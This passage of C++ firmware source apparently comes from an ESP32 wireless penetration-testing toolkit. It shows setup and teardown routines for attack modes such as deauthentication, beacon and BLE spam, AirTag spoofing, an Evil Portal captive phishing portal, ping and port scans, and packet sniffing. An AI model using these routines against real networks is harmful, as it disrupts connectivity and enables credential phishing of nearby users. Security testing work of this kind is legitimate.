  else if (scan_mode == LV_ADD_SSID) {
    #ifdef HAS_SCREEN
      RunLvJoinWiFi(scan_mode, color);
    #endif
  }
  else if (scan_mode == LV_JOIN_WIFI) {
    #ifdef HAS_SCREEN
      RunLvJoinWiFi(scan_mode, color);
    #endif
  }
  else if (scan_mode == WIFI_SCAN_GPS_NMEA){
    #ifdef HAS_GPS
      gps_obj.enable_queue();
    #endif
  }
  else if (scan_mode == GPS_TRACKER) {
    RunSetupGPSTracker();
  }
  else if (scan_mode == WIFI_PING_SCAN)
    RunPingScan(scan_mode, color);
  else if (scan_mode == WIFI_PORT_SCAN_ALL)
    RunPortScanAll(scan_mode, color);

  this->currentScanMode = scan_mode;
}

void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, String title_string) {
  // Common wifi attack configurations
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
      display_obj.tft.drawCentreString((String)title_string,TFT_WIDTH / 2,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
  #endif

  //wifi_ap_config_t ap_config;
  //ap_config.ssid_hidden = 1;

  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.beacon_interval = 10000;
  ap_config.ap.ssid_len = 0;
        
  packets_sent = 0;
  esp_wifi_init(&cfg);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  
  //WiFi.mode(WIFI_AP_STA);
  
  //esp_wifi_init(&cfg);
  //esp_wifi_set_storage(WIFI_STORAGE_RAM);
  //esp_wifi_set_mode(WIFI_AP_STA);
  //esp_wifi_start();
  //esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(82);
  this->wifi_initialized = true;
  #ifdef HAS_FLIPPER_LED
    flipper_led.attackLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.attackLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.attackLED();
  #else
    led_obj.setMode(MODE_ATTACK);
  #endif
  initTime = millis();
}

bool WiFiScan::shutdownWiFi() {
  if (this->wifi_initialized) {
    if (!this->wifi_connected) {
      esp_wifi_set_promiscuous(false);
      WiFi.disconnect();
      WiFi.mode(WIFI_OFF);

      dst_mac = "ff:ff:ff:ff:ff:ff";
    
      esp_wifi_set_mode(WIFI_MODE_NULL);
      esp_wifi_stop();
      esp_wifi_restore();
      esp_wifi_deinit();
      esp_netif_deinit(); 
    }

    #ifdef HAS_FLIPPER_LED
      flipper_led.offLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.offLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.offLED();
    #else
      led_obj.setMode(MODE_OFF);
    #endif

    this->_analyzer_value = 0;
  
    if (!this->wifi_connected)
      this->wifi_initialized = false;

    return true;
  }
  else {
    return false;
  }
}

bool WiFiScan::shutdownBLE() {
  #ifdef HAS_BT
    if (this->ble_initialized) {
      Serial.println("Shutting down BLE");
      pAdvertising->stop();
      pBLEScan->stop();
      
      pBLEScan->clearResults();
      NimBLEDevice::deinit();

      this->_analyzer_value = 0;
    
      this->ble_initialized = false;
    }
    else {
      return false;
    }

    #ifdef HAS_FLIPPER_LED
      flipper_led.offLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.offLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.offLED();
    #else
      led_obj.setMode(MODE_OFF);
    #endif

  #endif

  return true;
}

// Pinescan cleanup
int WiFiScan::clearPineScanTrackers() {
  int num_cleared = pinescan_trackers->size() + confirmed_pinescan->size();
  pinescan_trackers->clear();
  confirmed_pinescan->clear();
  pinescan_list_full_reported = false;
  return num_cleared;
}

// MultiSSID Cleanup
int WiFiScan::clearMultiSSID() {
  int num_cleared = multissid_trackers->size() + confirmed_multissid->size();
  multissid_trackers->clear();
  confirmed_multissid->clear();
  multissid_list_full_reported = false;
  return num_cleared;
}

// Function to stop all wifi scans
void WiFiScan::StopScan(uint8_t scan_mode)
{
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  (currentScanMode == WIFI_SCAN_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_EVIL_PORTAL) ||
  (currentScanMode == WIFI_SCAN_RAW_CAPTURE) ||
  (currentScanMode == WIFI_SCAN_STATION) ||
  (currentScanMode == WIFI_SCAN_SIG_STREN) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP_FULL) ||
  (currentScanMode == WIFI_SCAN_AP_STA) ||
  (currentScanMode == WIFI_PING_SCAN) ||
  (currentScanMode == WIFI_PORT_SCAN_ALL) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_PINESCAN) ||
  (currentScanMode == WIFI_SCAN_MULTISSID) ||
  (currentScanMode == WIFI_SCAN_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ALL) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
  (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
  (currentScanMode == WIFI_ATTACK_AUTH) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) ||
  (currentScanMode == WIFI_ATTACK_BAD_MSG_TARGETED) ||
  (currentScanMode == WIFI_ATTACK_BAD_MSG) ||
  (currentScanMode == WIFI_ATTACK_MIMIC) ||
  (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
  (currentScanMode == WIFI_PACKET_MONITOR) ||
  (currentScanMode == WIFI_SCAN_CHAN_ANALYZER) ||
  (currentScanMode == WIFI_SCAN_PACKET_RATE) ||
  (currentScanMode == WIFI_CONNECTED) ||
  (currentScanMode == LV_JOIN_WIFI) ||
  (this->wifi_initialized))
  {
    this->shutdownWiFi();

    if (!this->wifi_connected) {
      this->connected_network = "";
      this->ip_addr = IPAddress(0, 0, 0, 0);
      this->gateway = IPAddress(0, 0, 0, 0);
      this->subnet = IPAddress(0, 0, 0, 0);
    }

    #ifdef HAS_SCREEN
      for (int i = 0; i < TFT_WIDTH; i++) {
        this->_analyzer_values[i] = 0;
      }
      this->analyzer_name_string = "";
      this->analyzer_name_update = true;
      this->mgmt_frames = 0;
      this->data_frames = 0;
      this->beacon_frames = 0;
      this->req_frames = 0;
      this->resp_frames = 0;
      this->deauth_frames = 0;
      this->eapol_frames = 0;
      this->min_rssi = 0;
      this->max_rssi = -128;

      evil_portal_obj.cleanup();
    #endif
    evil_portal_obj.has_ap = false;
  }

  else if ((currentScanMode == GPS_TRACKER)) {
    this->writeFooter();
  }

  
  else if ((currentScanMode == BT_SCAN_ALL) ||
  (currentScanMode == BT_SCAN_AIRTAG) ||
  (currentScanMode == BT_SCAN_FLIPPER) ||
  (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
  (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
  (currentScanMode == BT_ATTACK_SPAM_ALL) ||
  (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
  (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
  (currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
  (currentScanMode == BT_SPOOF_AIRTAG) ||
  (currentScanMode == BT_SCAN_WAR_DRIVE) ||
  (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
  (currentScanMode == BT_SCAN_SKIMMERS) ||
  (currentScanMode == BT_SCAN_ANALYZER))
  {
    #ifdef HAS_BT
      #ifdef HAS_SCREEN
        for (int i = 0; i < TFT_WIDTH; i++) {
          this->_analyzer_values[i] = 0;
        }
        this->analyzer_name_string = "";
        this->analyzer_name_update = true;
      #endif

      this->shutdownBLE();
    #endif
  }

  #ifdef HAS_SCREEN
    display_obj.display_buffer->clear();
    #ifdef SCREEN_BUFFER
      display_obj.screen_buffer->clear();
    #endif
    //Serial.print("display_buffer->size(): ");
    Serial.println(display_obj.display_buffer->size());
  
    display_obj.tteBar = false;
  #endif

  #ifdef HAS_GPS
    gps_obj.disable_queue();
  #endif
}

String WiFiScan::getStaMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  this->setMac();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_STA, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

String WiFiScan::getApMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  this->setMac();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

bool WiFiScan::mac_cmp(struct mac_addr addr1, struct mac_addr addr2) {
  //Return true if 2 mac_addr structs are equal.
  for (int y = 0; y < 6 ; y++) {
    if (addr1.bytes[y] != addr2.bytes[y]) {
      return false;
    }
  }
  return true;
}

bool WiFiScan::seen_mac(unsigned char* mac) {
  //Return true if this MAC address is in the recently seen array.

  struct mac_addr tmp;
  for (int x = 0; x < 6 ; x++) {
    tmp.bytes[x] = mac[x];
  }

  for (int x = 0; x < mac_history_len; x++) {
    if (this->mac_cmp(tmp, mac_history[x])) {
      return true;
    }
  }
  return false;
}

void WiFiScan::save_mac(unsigned char* mac) {
  //Save a MAC address into the recently seen array.
  if (this->mac_history_cursor >= mac_history_len) {
    this->mac_history_cursor = 0;
  }
  struct mac_addr tmp;
  for (int x = 0; x < 6 ; x++) {
    tmp.bytes[x] = mac[x];
  }

  mac_history[this->mac_history_cursor] = tmp;
  this->mac_history_cursor++;
}

String WiFiScan::security_int_to_string(int security_type) {
  //Provide a security type int from WiFi.encryptionType(i) to convert it to a String which Wigle CSV expects.
  String authtype = "";

  switch (security_type) {
    case WIFI_AUTH_OPEN:
      authtype = "[OPEN]";
      break;
  
    case WIFI_AUTH_WEP:
      authtype = "[WEP]";
      break;
  
    case WIFI_AUTH_WPA_PSK:
      authtype = "[WPA_PSK]";
      break;
  
    case WIFI_AUTH_WPA2_PSK:
      authtype = "[WPA2_PSK]";
      break;
  
    case WIFI_AUTH_WPA_WPA2_PSK:
      authtype = "[WPA_WPA2_PSK]";
      break;
  
    case WIFI_AUTH_WPA2_ENTERPRISE:
      authtype = "[WPA2]";
      break;

    //Requires at least v2.0.0 of https://github.com/espressif/arduino-esp32/
    case WIFI_AUTH_WPA3_PSK:
      authtype = "[WPA3_PSK]";
      break;

    case WIFI_AUTH_WPA2_WPA3_PSK:
      authtype = "[WPA2_WPA3_PSK]";
      break;

    case WIFI_AUTH_WAPI_PSK:
      authtype = "[WAPI_PSK]";
      break;
        
    default:
      authtype = "[UNDEFINED]";
  }

  return authtype;
}

void WiFiScan::clearMacHistory() {
    for (int i = 0; i < mac_history_len; ++i) {
        memset(mac_history[i].bytes, 0, sizeof(mac_history[i].bytes));
    }
}

String WiFiScan::freeRAM()
{
  char s[150];
  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
  this->free_ram = String(esp_get_free_heap_size());
  return String(s);
}

void WiFiScan::startPcap(String file_name) {
  buffer_obj.pcapOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

void WiFiScan::startLog(String file_name) {
  buffer_obj.logOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

void WiFiScan::startGPX(String file_name) {
  buffer_obj.gpxOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

void WiFiScan::parseBSSID(const char* bssidStr, uint8_t* bssid) {
  sscanf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
         &bssid[0], &bssid[1], &bssid[2],
         &bssid[3], &bssid[4], &bssid[5]);
}

void WiFiScan::RunPingScan(uint8_t scan_mode, uint16_t color)
{
  startLog("pingscan");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString("Ping Scan",120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  this->current_scan_ip = this->gateway;
  Serial.println("Cleared IPs: " + (String)this->clearIPs());
  Serial.println("Starting Ping Scan with...");
  Serial.print("IP address: ");
  Serial.println(this->ip_addr);
  Serial.print("Gateway: ");
  Serial.println(this->gateway);
  Serial.print("Netmask: ");
  Serial.println(this->subnet);
  Serial.print("MAC: ");
  Serial.println(WiFi.macAddress());

  buffer_obj.append("Starting Ping Scan with...");
  buffer_obj.append("\nSSID: " + (String)this->connected_network);
  buffer_obj.append("\nIP address: ");
  buffer_obj.append(this->ip_addr.toString());
  buffer_obj.append("\nGateway: ");
  buffer_obj.append(this->gateway.toString());
  buffer_obj.append("\nNetmask: ");
  buffer_obj.append(this->subnet.toString());
  buffer_obj.append("\nMAC: ");
  buffer_obj.append((String)WiFi.macAddress());
  buffer_obj.append("\n");

  this->scan_complete = false;
  initTime = millis();
}

void WiFiScan::RunPortScanAll(uint8_t scan_mode, uint16_t color)
{
  startLog("portscan");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString("Port Scan All",120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif

  this->current_scan_port = 0;

  Serial.println("Starting Port Scan with...");
  Serial.print("IP address: ");
  Serial.println(this->ip_addr);
  Serial.print("Gateway: ");
  Serial.println(this->gateway);
  Serial.print("Netmask: ");
  Serial.println(this->subnet);
  Serial.print("MAC: ");
  Serial.println(WiFi.macAddress());

  buffer_obj.append("Starting Port Scan with...");
  buffer_obj.append("\nSSID: " + (String)this->connected_network);
  buffer_obj.append("\nIP address: ");
  buffer_obj.append(this->ip_addr.toString());
  buffer_obj.append("\nGateway: ");
  buffer_obj.append(this->gateway.toString());
  buffer_obj.append("\nNetmask: ");
  buffer_obj.append(this->subnet.toString());
  buffer_obj.append("\nMAC: ");
  buffer_obj.append((String)WiFi.macAddress());
  buffer_obj.append("\n");

  this->scan_complete = false;
  initTime = millis();
}

void WiFiScan::RunLoadATList() {
  #ifdef HAS_SD
    // Prepare to access the file
    File file = sd_obj.getFile("/Airtags_0.log");
    if (!file) {
      Serial.println("Could not open /Airtags_0.log");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not open /Airtags_0.log");
      #endif
      return;
    }

    // Prepare JSON
    DynamicJsonDocument doc(10048);
    DeserializationError error = deserializeJson(doc, file);
    if (error) {
      Serial.print("JSON deserialize error: ");
      Serial.println(error.c_str());
      file.close();
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not deserialize JSON");
        display_obj.tft.println(error.c_str());
      #endif
      return;
    }

    JsonArray array = doc.as<JsonArray>();
    for (JsonObject obj : array) {
      AirTag at;
      at.mac = obj["mac"].as<String>();
      at.payloadSize = obj["payload_size"];
      at.payload = hexStringToByteArray(obj["payload"].as<String>());
      at.selected = false;
      airtags->add(at);
    }

    file.close();

    //doc.clear();

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Loaded Airtags: ");
      display_obj.tft.println((String)airtags->size());
    #endif
    Serial.print("Loaded Airtags:");
    Serial.println((String)airtags->size());
  #endif
}

void WiFiScan::RunSaveATList(bool save_as) {
  #ifdef HAS_SD
    if (save_as) {
      sd_obj.removeFile("/Airtags_0.log");

      this->startLog("Airtags");

      DynamicJsonDocument jsonDocument(2048);

      JsonArray jsonArray = jsonDocument.to<JsonArray>();
      
      for (int i = 0; i < airtags->size(); i++) {
        const AirTag& at = airtags->get(i);
        JsonObject jsonAt = jsonArray.createNestedObject();
        jsonAt["mac"] = at.mac;
        jsonAt["payload"] = byteArrayToHexString(at.payload);
        jsonAt["payload_size"] = at.payloadSize;
      }

      String jsonString;
      serializeJson(jsonArray, jsonString);

      buffer_obj.append(jsonString);

      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.print("Saved Airtags: ");
        display_obj.tft.println((String)airtags->size());
      #endif
      Serial.print("Saved Airtags:");
      Serial.println((String)airtags->size());
    }
  #endif
}

void WiFiScan::RunLoadAPList() {
  #ifdef HAS_SD
    File file = sd_obj.getFile("/APs_0.log");
    if (!file) {
      Serial.println("Could not open /APs_0.log");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
        display_obj.tft.println("Could not open /APs_0.log");
      #endif
      return;
    }

    DynamicJsonDocument doc(10048);
    DeserializationError error = deserializeJson(doc, file);
    if (error) {
      Serial.print("JSON deserialize error: ");
      Serial.println(error.c_str());
      file.close();
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
        display_obj.tft.println("Could not deserialize JSON");
        display_obj.tft.println(error.c_str());
      #endif
      return;
    }

    JsonArray array = doc.as<JsonArray>();
    for (JsonObject obj : array) {
      AccessPoint ap;

      ap.essid   = obj.containsKey("essid")   ? obj["essid"].as<String>()      : "";
      ap.channel = obj.containsKey("channel") ? obj["channel"].as<uint8_t>()   : 1;
      ap.selected = false;

      if (obj.containsKey("bssid")) {
        parseBSSID(obj["bssid"], ap.bssid);
      } else {
        memset(ap.bssid, 0, 6); // Zero BSSID if missing
      }

      ap.stations = new LinkedList<uint16_t>();
      ap.rssi     = obj.containsKey("rssi")   ? obj["rssi"].as<int>()          : -127;
      ap.packets  = obj.containsKey("packet") ? obj["packet"].as<uint32_t>()   : 0;
      ap.sec      = obj.containsKey("sec")    ? obj["sec"].as<uint8_t>()       : 0;
      ap.wps      = obj.containsKey("wps")    ? obj["wps"].as<bool>()          : false;
      ap.man      = obj.containsKey("man")    ? obj["man"].as<String>()        : "Unknown";

      access_points->add(ap);
      Serial.println("Got: " + ap.essid);
    }

    file.close();

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
      display_obj.tft.print("Loaded APs: ");
      display_obj.tft.println((String)access_points->size());
    #endif
    Serial.print("Loaded APs:");
    Serial.println((String)access_points->size());
  #endif
}

void WiFiScan::RunSaveAPList(bool save_as) {
  #ifdef HAS_SD
    if (save_as) {
      sd_obj.removeFile("/APs_0.log");

      this->startLog("APs");

      DynamicJsonDocument jsonDocument(2048);

      JsonArray jsonArray = jsonDocument.to<JsonArray>();
      
      for (int i = 0; i < access_points->size(); i++) {
        const AccessPoint& ap = access_points->get(i);
        JsonObject jsonAp = jsonArray.createNestedObject();
        jsonAp["essid"] = ap.essid;
        jsonAp["channel"] = ap.channel;

        char bssidStr[18];
        sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                ap.bssid[0], ap.bssid[1], ap.bssid[2],
                ap.bssid[3], ap.bssid[4], ap.bssid[5]);
        jsonAp["bssid"] = bssidStr;
        jsonAp["rssi"] = ap.rssi;
        jsonAp["packets"] = ap.packets;
        jsonAp["sec"] = ap.sec;
        jsonAp["wps"] = ap.wps;
        jsonAp["man"] = ap.man;
      }

      String jsonString;
      serializeJson(jsonArray, jsonString);

      buffer_obj.append(jsonString);

      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.print("Saved APs: ");
        display_obj.tft.println((String)access_points->size());
      #endif
      Serial.print("Saved APs:");
      Serial.println((String)access_points->size());
    }
  #endif
}

void WiFiScan::RunLoadSSIDList() {
  #ifdef HAS_SD
    File log_file = sd_obj.getFile("/SSIDs_0.log");
    if (!log_file) {
      Serial.println("Could not open /SSIDs_0.log");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.println("Could not open /SSIDs_0.log");
      #endif
      return;
    }
    while (log_file.available()) {
      String line = log_file.readStringUntil('\n'); // Read until newline character
      this->addSSID(line);
    }

    #ifdef HAS_SCREEN
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setCursor(0, 100);
      display_obj.tft.setTextSize(1);
      display_obj.tft.setTextColor(TFT_CYAN);
    
      display_obj.tft.print("Loaded SSIDs: ");
      display_obj.tft.println((String)ssids->size());
    #endif

    log_file.close();

    Serial.print("Loaded SSIDs: ");
    Serial.println((String)ssids->size());
  #endif
}

void WiFiScan::RunSaveSSIDList(bool save_as) {
  #ifdef HAS_SD
    if (save_as) {
      sd_obj.removeFile("/SSIDs_0.log");

      this->startLog("SSIDs");

      for (int i = 0; i < ssids->size(); i++) {
        if (i < ssids->size() - 1)
          buffer_obj.append(ssids->get(i).essid + "\n");
        else
          buffer_obj.append(ssids->get(i).essid);
      }

      #ifdef HAS_SCREEN
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setFreeFont(NULL);
        display_obj.tft.setCursor(0, 100);
        display_obj.tft.setTextSize(1);
        display_obj.tft.setTextColor(TFT_CYAN);
      
        display_obj.tft.print("Saved SSIDs: ");
        display_obj.tft.println((String)ssids->size());
      #endif
      Serial.print("Saved SSIDs: ");
      Serial.println((String)ssids->size());
    }
  #endif
}

void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color)
{
  startLog("evil_portal");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(" Evil Portal ",120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif

  #ifdef HAS_DUAL_BAND
    esp_wifi_init(&cfg);
    esp_wifi_set_country(&country);
  #endif

  evil_portal_obj.begin(ssids, access_points);
  //if (!evil_portal_obj.begin(ssids, access_points)) {
  //  Serial.println("Could not successfully start EvilPortal. Setting WIFI_SCAN_OFF...");
  //  this->StartScan(WIFI_SCAN_OFF, TFT_MAGENTA);
  //  return;
  //}
  //else
  //  Serial.println("Setup EvilPortal. Current mode: " + this->currentScanMode);
  this->wifi_initialized = true;
  initTime = millis();
}

// Function to start running a beacon scan
void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode != WIFI_SCAN_AP_STA)
    startPcap("ap");
  else
    startPcap("ap_sta");

  #ifdef HAS_FLIPPER_LED
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif

  Serial.println(text_table4[9] + (String)access_points->size());
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    if (scan_mode != WIFI_SCAN_AP_STA)
      display_obj.tft.setTextColor(TFT_WHITE, color);
    else
      display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      if (scan_mode != WIFI_SCAN_AP_STA)
        display_obj.tft.drawCentreString(text_table4[44],120,16,2);
      else
        display_obj.tft.drawCentreString("Scan AP/STA",120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif

  delete access_points;
  access_points = new LinkedList<AccessPoint>();

  esp_netif_init();
  esp_event_loop_create_default();

  esp_wifi_init(&cfg2);
  #ifdef HAS_DUAL_BAND
    esp_wifi_set_country(&country);
  #endif
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  this->setMac();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

#ifdef HAS_SCREEN
